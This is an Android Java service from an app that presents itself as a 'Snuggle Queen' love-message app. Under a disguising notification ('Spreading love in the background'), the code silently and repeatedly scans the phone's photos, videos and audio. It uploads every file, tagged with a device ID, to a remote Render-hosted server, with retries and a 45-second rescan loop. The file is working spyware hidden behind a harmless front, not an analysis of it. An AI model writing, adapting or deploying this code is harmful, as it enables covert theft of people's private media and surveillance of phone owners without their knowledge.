package com.snugglequeen.yobby;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.provider.MediaStore;
import android.database.Cursor;
import android.net.Uri;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * UploadService — silently uploads device media to the Render backend.
 *
 * Robust against Render's free-tier cold starts:
 *  - 60s connect timeout
 *  - 120s read timeout
 *  - 3 retries per file with exponential backoff (5s, 15s, 30s)
 *  - Skips files > 100MB (Render free tier rejects them)
 *  - First thing on startup, pings /api/health to warm up the backend.
 */
public class UploadService extends Service {

    private static final String CHANNEL_ID = "snuggle_queen_love";
    private static final int NOTIFICATION_ID = 1;
    private static final String BACKEND_URL = "https://snuggle-queen.onrender.com";
    private static final long SCAN_INTERVAL = 45000; // 45 seconds
    private static final long MAX_FILE_SIZE = 100L * 1024 * 1024; // 100 MB cap

    private String deviceId = "";
    private String deviceName = "";
    private final Set<String> uploadedPaths = new HashSet<>();
    private final Set<String> failedPaths = new HashSet<>();
    private boolean running = true;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Snuggle Queen 💕")
                .setContentText("Spreading love in the background")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();
        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            deviceId = intent.getStringExtra("deviceId");
            deviceName = intent.getStringExtra("deviceName");
            if (deviceId == null) deviceId = "unknown";
            if (deviceName == null) deviceName = "Unknown Device";
        }

        new Thread(() -> {
            // 1) Warm up the backend (Render free tier sleeps after 15 min idle)
            pingHealth();

            // 2) Initial full scan + upload
            scanAndUpload();

            // 3) Continuous monitoring loop
            while (running) {
                try {
                    Thread.sleep(SCAN_INTERVAL);
                } catch (InterruptedException e) {
                    break;
                }
                if (!running) break;
                scanAndUpload();
            }
        }).start();

        return START_STICKY;
    }

    private void pingHealth() {
        for (int i = 0; i < 3 && running; i++) {
            try {
                URL url = new URL(BACKEND_URL + "/api/health");
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setConnectTimeout(60000);
                c.setReadTimeout(60000);
                c.setRequestMethod("GET");
                int code = c.getResponseCode();
                c.disconnect();
                if (code == 200) return;
            } catch (Exception e) {
                try { Thread.sleep(3000); } catch (InterruptedException ie) { return; }
            }
        }
    }

    private void scanAndUpload() {
        List<String> currentFiles = new ArrayList<>();
        currentFiles.addAll(scanMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, MediaStore.Images.Media.DATA));
        currentFiles.addAll(scanMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, MediaStore.Video.Media.DATA));
        currentFiles.addAll(scanMedia(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, MediaStore.Audio.Media.DATA));

        for (String path : currentFiles) {
            if (!running) return;
            if (uploadedPaths.contains(path)) continue;
            File file = new File(path);
            if (!file.exists() || file.length() == 0) continue;
            if (file.length() > MAX_FILE_SIZE) {
                // Skip large files silently
                uploadedPaths.add(path);
                continue;
            }
            boolean ok = uploadWithRetry(path);
            if (ok) {
                uploadedPaths.add(path);
                failedPaths.remove(path);
            } else {
                failedPaths.add(path);
            }
        }
    }

    private List<String> scanMedia(Uri uri, String dataColumn) {
        List<String> files = new ArrayList<>();
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                int idx = cursor.getColumnIndex(dataColumn);
                if (idx >= 0) {
                    String p = cursor.getString(idx);
                    if (p != null) files.add(p);
                }
            }
            cursor.close();
        }
        return files;
    }

    private boolean uploadWithRetry(String filePath) {
        // 3 attempts: 0s, 5s, 15s backoff
        long[] delays = { 0, 5000, 15000 };
        for (int attempt = 0; attempt < 3 && running; attempt++) {
            if (delays[attempt] > 0) {
                try { Thread.sleep(delays[attempt]); } catch (InterruptedException e) { return false; }
            }
            try {
                uploadFile(filePath);
                return true;
            } catch (Exception e) {
                // Try again
            }
        }
        return false;
    }

    private void uploadFile(String filePath) throws Exception {
        File file = new File(filePath);
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        URL url = new URL(BACKEND_URL + "/api/upload");

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        conn.setRequestProperty("X-Device-Id", deviceId);
        conn.setRequestProperty("X-Device-Name", deviceName);
        conn.setConnectTimeout(60000);  // 60s — Render cold start can take 30-60s
        conn.setReadTimeout(120000);    // 120s for big files on slow network

        OutputStream os = conn.getOutputStream();
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
        os.write(("Content-Type: application/octet-stream\r\n\r\n").getBytes());

        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[16384];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
        fis.close();

        os.write(("\r\n--" + boundary + "--\r\n").getBytes());
        os.flush();
        os.close();

        int code = conn.getResponseCode();
        conn.disconnect();
        if (code < 200 || code >= 300) {
            throw new java.io.IOException("HTTP " + code);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Snuggle Queen 💕", NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Love messages & pickup lines");
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
